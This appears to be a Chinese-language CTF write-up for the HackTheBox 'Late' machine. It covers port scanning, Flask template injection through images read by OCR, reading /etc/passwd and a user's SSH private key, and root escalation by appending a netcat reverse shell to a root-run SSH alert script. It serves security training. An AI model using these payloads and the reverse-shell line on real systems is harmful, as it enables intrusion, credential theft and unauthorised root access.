<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/is83_mt3cchPaHZwhk6blg)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 107篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuXkh7GQTHfX9ERlV3eLQL36JjgNPftPKSibIBzxv5FDJOTSVGnyZW4PiabEfc5w1xZZ7QJAS6TPpnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
`靶机信息``靶机地址:``https://app.hackthebox.com/machines/Late``靶场: HackTheBox.com``靶机名称: Late``难度: 简单``提示信息:``无``目标:  user.txt和root.txt`
```

```
`实验环境``攻击机:Vbox Manjaro 10.10.14.8``靶机:10.10.11.156`
```

**信息收集**
--------

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -p- -v 10.10.11.156
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
sudo nmap -sC -sV -p22,80 10.10.11.156 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

扫描到22和80端口开放，先来看看80端口

Web渗透
-----

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问后是一个静态页面，源码中找到一个域名。绑定后访问

```
sudo nano /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问域名后是一个flask开发的上传功能页面，这个页面可以将上传的图像文件转换为文本，抓个包传个文件看看。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

上传后返回一个文本，文本内是图片识别出来的内容。猜测一下，用户上传图片，后台接收后交给ocr类工具识别，识别后输出内容，再由flask生成文本提供下载。如果猜测没错的话可以利用flask的模板注入漏洞，验证一下

（如果对flask的SSTI模板注入不了解可以自行搜索或看下下面的链接）

```
https://www.jianshu.com/p/b6f1aea3a2eb
```

1。将payload保存为图片

```
\{\{1+1\}\}
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

可以看到下载的内容中有计算结果，再来验证一下读取文件

```
\{\{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() \}\}
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

经过几次修改payload拿到passwd文件，并且找到普通用户svc_acc，先尝试读取用户目录下的id_rsa文件，如果不能读取就反弹shell到攻击机。

```
\{\{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() \}\}
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到svc_acc用户的key文件，登录SSH

```
ssh svc_acc@10.10.11.156 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录成功，先来看看flag

```
`ls``cat user.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到user.txt，上传个pspy64检查后台运行程序

```
`https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0``chmod +x pspy64``./pspy64`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

后台有root用户执行的两条命令，第一个是将/root/scripts/ssh-alert.sh脚本复制到/usr/local/sbin/目录下，第二个命令是对/usr/local/sbin/ssh-alert.sh脚本添加svc_acc用户权限，来看看这个脚本

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

脚本看起来像是SSH登录时触发的脚本，

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在重新执行pspy64后登录ssh，发现svc_acc用户登录SSH时root用户会执行/usr/local/sbin/ssh-alert.sh脚本。来修改下这个脚本，反弹shell到攻击机上

1。将反弹shell追加到ssh-alert.sh脚本中（这个文件不能修改只能追加，pspy64监听后台时有条命令没显示出来第二次执行pspy64时才发现）

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f" >>/usr/local/sbin/ssh-alert.sh
```

2。攻击机监听4444端口

```
nc -nlvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3。SSH登录 触发root执行ssh-alert.sh脚本

这三步要开启3个窗口快速执行，如果慢了root用户会重新复制一个ssh-alert.sh脚本到/usr/local/sbin目录下

```
ssh svc_acc@10.10.11.156 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到root权限，来找下flag

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)